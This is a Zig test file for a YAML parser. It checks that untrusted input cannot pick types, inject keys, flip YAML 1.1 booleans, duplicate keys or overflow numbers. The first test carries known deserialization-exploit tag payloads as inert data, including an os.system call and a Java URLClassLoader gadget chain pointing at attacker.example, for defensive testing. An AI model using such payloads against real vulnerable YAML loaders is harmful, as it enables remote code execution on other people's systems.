//! What input can make of the values a program reads: types it did not
//! ask for, values that mean something else, keys that collide.

const std = @import("std");
const yaml = @import("yaml");
const testing = std.testing;
const gpa = testing.allocator;

test "security: CWE-502 a tag never chooses what is built" {
    // The tags of the deserialization exploits of other libraries'
    // loaders (PyYAML, SnakeYAML, Psych, js-yaml) read as the data they
    // are written as, their tags kept on the nodes and nothing made of
    // them: no type is looked up by a tag's name.
    const text =
        \\- !!python/object/apply:os.system ["echo pwned"]
        \\- !ruby/object:Gem::Installer {i: x}
        \\- !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.example/"]]]]
        \\- !!js/function "function () { return 1 }"
        \\
    ;
    const parsed = try yaml.parseFromSlice(yaml.Value, gpa, text, .{});
    defer parsed.deinit();
    const items = parsed.value.sequence;
    try testing.expectEqualStrings("echo pwned", items[0].sequence[0].string);
    try testing.expectEqualStrings("x", items[1].get("i").?.string);
    try testing.expectEqualStrings("http://attacker.example/", items[2].sequence[0].sequence[0].sequence[0].sequence[0].string);
    try testing.expectEqualStrings("function () { return 1 }", items[3].string);
    // Into a type, the caller's type decides, whatever the tag.
    const Job = struct { command: []const u8 };
    const job = try yaml.parseFromSlice(Job, gpa, "command: !!python/object/apply:os.system ls\n", .{});
    defer job.deinit();
    try testing.expectEqualStrings("ls", job.value.command);
}

test "security: CWE-1321 merge keys and __proto__ are keys like any other" {
    // YAML 1.1's `<<` merge is not YAML 1.2's: no mapping is merged into
    // another, so a key cannot arrive by way of one; `__proto__` is text.
    const text =
        \\base: &b {admin: true}
        \\user:
        \\  <<: *b
        \\  __proto__: {admin: true}
        \\  name: x
        \\
    ;
    const parsed = try yaml.parseFromSlice(yaml.Value, gpa, text, .{});
    defer parsed.deinit();
    const user = parsed.value.get("user").?;
    try testing.expectEqual(3, user.mapping.len);
    try testing.expectEqual(null, user.get("admin"));
    try testing.expect(user.get("<<").?.get("admin").?.bool);
    const User = struct { name: []const u8, admin: bool = false };
    try testing.expectError(error.UnknownField, yaml.parseFromSlice(User, gpa, "<<: {admin: true}\nname: x\n", .{}));
}

test "security: CWE-704 YAML 1.1's booleans, octals and sexagesimals do not change type" {
    // The Norway problem: under YAML 1.1 `NO` is false. Under 1.2's core
    // schema, which this reads, it and the rest are strings, and a
    // leading 0 is decimal, not octal.
    const parsed = try yaml.parseFromSlice(yaml.Value, gpa, "[yes, no, on, off, y, n, NO, Yes, 1:20, 0777, 012, 0o17, 0x1F]", .{});
    defer parsed.deinit();
    const items = parsed.value.sequence;
    for (items[0..9], [_][]const u8{ "yes", "no", "on", "off", "y", "n", "NO", "Yes", "1:20" }) |item, text| {
        try testing.expectEqualStrings(text, item.string);
    }
    try testing.expectEqual(777, items[9].integer);
    try testing.expectEqual(12, items[10].integer);
    try testing.expectEqual(15, items[11].integer);
    try testing.expectEqual(31, items[12].integer);
    const Config = struct { country: []const u8, enabled: bool };
    try testing.expectError(error.UnexpectedType, yaml.parseFromSlice(Config, gpa, "country: NO\nenabled: yes\n", .{}));
}

test "security: CWE-694 duplicate keys, equal by value, are refused" {
    // Two parsers of one document must not read two configurations: one
    // taking the first of a key and another the last.
    const cases = [_][]const u8{ "{a: 1, a: 2}", "{a: 1, \"a\": 2}", "{1: x, 0x1: y}", "{1.0: x, 1e0: y}", "{true: x, True: y}", "{~: x, null: y}", "{[a]: x, [a]: y}", "a: 1\nb: 2\na: 3\n" };
    for (cases) |text| {
        errdefer std.debug.print("input: {s}\n", .{text});
        try testing.expectError(error.DuplicateKey, yaml.parseFromSlice(yaml.Value, gpa, text, .{}));
    }
    // Kept only when asked, the last then the one read.
    const S = struct { a: u8 };
    const kept = try yaml.parseFromSlice(S, gpa, "a: 1\na: 2\n", .{ .duplicate_keys = .keep });
    defer kept.deinit();
    try testing.expectEqual(2, kept.value.a);
}

test "security: CWE-915 a key no field has is refused, not dropped" {
    const User = struct { name: []const u8, admin: bool = false };
    try testing.expectError(error.UnknownField, yaml.parseFromSlice(User, gpa, "name: x\nis_admin: true\n", .{}));
    try testing.expectError(error.UnknownField, yaml.parseFromSlice(User, gpa, "name: x\nAdmin: true\n", .{}));
    // Skipping them is the caller's choice, and sets nothing.
    const skipped = try yaml.parseFromSlice(User, gpa, "name: x\nis_admin: true\n", .{ .ignore_unknown_fields = true });
    defer skipped.deinit();
    try testing.expect(!skipped.value.admin);
}

test "security: CWE-190 numbers past their type are refused, in every optimize mode" {
    try testing.expectError(error.Overflow, yaml.parseFromSlice(u8, gpa, "256", .{}));
    try testing.expectError(error.Overflow, yaml.parseFromSlice(i64, gpa, "9223372036854775808.0", .{}));
    try testing.expectError(error.Overflow, yaml.parseFromSlice(u64, gpa, "-1", .{}));
    try testing.expectError(error.UnexpectedType, yaml.parseFromSlice(i64, gpa, "1e999999", .{}));
    try testing.expectError(error.UnexpectedType, yaml.parseFromSlice(u32, gpa, ".nan", .{}));
    try testing.expectError(error.SyntaxError, yaml.parseFromSlice(u8, gpa, "%YAML 1.99999999\n--- 1\n", .{}));
    // A number too big for an i64 stays a number in a Value, as written.
    const big = try yaml.parseFromSlice(yaml.Value, gpa, "123456789012345678901234567890", .{});
    defer big.deinit();
    try testing.expectEqualStrings("123456789012345678901234567890", big.value.number_string);
}
